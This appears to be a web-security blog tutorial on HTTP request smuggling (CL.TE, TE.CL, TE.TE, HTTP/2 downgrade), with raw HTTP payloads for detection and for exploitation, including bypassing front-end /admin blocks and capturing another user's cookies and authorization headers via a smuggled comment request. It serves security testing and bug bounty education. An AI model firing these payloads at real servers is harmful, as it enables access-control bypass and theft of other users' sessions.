---
title: "HTTP Request Smuggling: CL.TE, TE.CL, and Detection"
date: 2024-09-12T10:00:00-05:00
draft: false
tags: ["request-smuggling", "http", "web-security", "desync"]
difficulty: ""
---

HTTP request smuggling exploits disagreements between how a front-end server (load balancer, reverse proxy, CDN) and a back-end server determine where one HTTP request ends and the next one begins. If they disagree, an attacker can "smuggle" a partial request that gets prepended to the next legitimate user's request. This post covers the mechanics, detection, and exploitation of the three main variants.

<!--more-->

## Why It Happens

HTTP/1.1 supports two ways to define the length of a request body:

**Content-Length (CL)**: specifies the exact number of bytes in the body.

**Transfer-Encoding (TE)**: uses chunked encoding where the body is sent in chunks, each prefixed with its size in hex, terminated by a zero-length chunk.

The HTTP spec says that if both headers are present, Transfer-Encoding takes precedence. But not every server follows the spec. When a front-end and back-end server handle these headers differently, you get request smuggling.

## CL.TE (Front-end uses Content-Length, Back-end uses Transfer-Encoding)

The front-end reads Content-Length to determine the request boundary. The back-end reads Transfer-Encoding.

```http
POST / HTTP/1.1
Host: example.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

The front-end sees Content-Length: 13 and forwards 13 bytes (`0\r\n\r\nSMUGGLED`). The back-end processes the chunked body, sees the `0\r\n\r\n` (zero-length chunk, end of body), and treats `SMUGGLED` as the start of the next request.

The word `SMUGGLED` now sits in the back-end's buffer. When the next legitimate user sends a request, `SMUGGLED` gets prepended to it.

A more practical payload:

```http
POST / HTTP/1.1
Host: example.com
Content-Length: 35
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Ignore: 
```

The smuggled `GET /admin` request gets combined with the next user's request. If the back-end processes it, the response goes to that user, potentially leaking admin content.

## TE.CL (Front-end uses Transfer-Encoding, Back-end uses Content-Length)

The reverse case. The front-end reads chunked encoding, the back-end reads Content-Length.

```http
POST / HTTP/1.1
Host: example.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

The front-end processes the chunked body: reads chunk of size 8 (`SMUGGLED`), then reads the terminating `0` chunk. It forwards the entire body.

The back-end reads Content-Length: 3, which only covers `8\r\n`. The remaining bytes (`SMUGGLED\r\n0\r\n\r\n`) are left in the buffer as the start of the next request.

## TE.TE (Both use Transfer-Encoding, but handle obfuscation differently)

Both servers support Transfer-Encoding, but one of them can be tricked into not recognizing it by obfuscating the header:

```http
Transfer-Encoding: chunked
Transfer-Encoding : chunked        (space before colon)
Transfer-Encoding: xchunked
Transfer-Encoding: chunked\r\nTransfer-Encoding: x
Transfer-Encoding: chunked
Transfer-encoding: x               (case variation)
```

One server recognizes the header and uses chunked encoding. The other doesn't recognize the obfuscated version and falls back to Content-Length. Now you're back to either CL.TE or TE.CL depending on which server is which.

## Detection

**Timing-based detection for CL.TE**:

Send a request where, if the back-end uses Transfer-Encoding, it will wait for more data (because the chunked body isn't complete according to TE, but is complete according to CL):

```http
POST / HTTP/1.1
Host: example.com
Content-Length: 4
Transfer-Encoding: chunked

1
A
X
```

If the back-end uses TE, it reads chunk `1` (byte `A`), then tries to read the next chunk size. `X` is not a valid chunk size, so it waits for more data. If the response is delayed, the back-end likely uses TE (CL.TE confirmed).

**Timing-based detection for TE.CL**:

```http
POST / HTTP/1.1
Host: example.com
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

If the back-end uses CL, it reads 6 bytes and processes the request normally. If it uses TE, it reads the `0` terminator and treats `X` as the start of the next request, which is malformed, causing an error or delay.

**Differential response detection**: send two requests in sequence. The first smuggles a partial request that should change how the second is processed:

```http
POST / HTTP/1.1
Host: example.com
Content-Length: 49
Transfer-Encoding: chunked

0

GET /404-not-found HTTP/1.1
Host: example.com

```

Then immediately send a normal `GET /` request. If smuggling works, the back-end combines the smuggled `GET /404-not-found` with your second request, and you get a 404 instead of the expected response.

## Exploitation Scenarios

**Bypassing front-end security**: the front-end blocks requests to `/admin`. Smuggle a request that reaches the back-end directly:

```http
POST / HTTP/1.1
Host: example.com
Content-Length: 37
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: example.com

```

The front-end sees a POST to `/` (allowed). The back-end processes the smuggled GET to `/admin`.

**Capturing other users' requests**: smuggle a request that stores the next user's request as data:

```http
POST / HTTP/1.1
Host: example.com
Content-Length: 150
Transfer-Encoding: chunked

0

POST /submit-comment HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400

comment=
```

The next user's request gets appended to `comment=`. Their entire request, including cookies and authorization headers, gets submitted as a comment that you can then read.

**Cache poisoning**: if there's a cache between the front-end and back-end, smuggle a request that changes what gets cached for a specific URL. The poisoned cache then serves the malicious response to all users.

**Credential hijacking via redirects**: smuggle a request to a path that returns a redirect. The redirect response goes to the next user, whose browser follows it, potentially sending their cookies to the attacker's domain.

## Tools

**Burp Suite**: has built-in request smuggling scanner (Burp Scanner detects it, and there's a manual testing tab).

**smuggler.py**: standalone tool that tests multiple smuggling variants:

```bash
python3 smuggler.py -u https://example.com
```

**HTTP Request Smuggler** (Burp extension by James Kettle): the most comprehensive testing tool for this. It tries dozens of technique variations automatically.

## HTTP/2 Considerations

HTTP/2 uses binary framing and doesn't use Content-Length or Transfer-Encoding in the same way. But many infrastructure setups downgrade HTTP/2 to HTTP/1.1 between the front-end and back-end. The front-end receives HTTP/2, converts it to HTTP/1.1, and forwards it.

This creates a new attack surface: the H2.CL and H2.TE variants. The HTTP/2 request specifies the body length through frames, but when downgraded, the injected Content-Length or Transfer-Encoding headers in the HTTP/2 request might be used by the HTTP/1.1 back-end.

Test by sending HTTP/2 requests with conflicting content-length values or injecting transfer-encoding headers that get passed through during downgrade.

## Reality Check

Request smuggling is hard to find, hard to confirm without causing issues, and hard to exploit reliably. The timing between your smuggled request and the next user's request needs to line up. In high-traffic applications, this happens quickly. In low-traffic apps, you might need to wait or send multiple requests.

For bug bounty, demonstrating the desync (getting a different response than expected for your second request) is usually enough. You don't need to capture another user's request in production. Explain the attack chain in your report and the theoretical impact.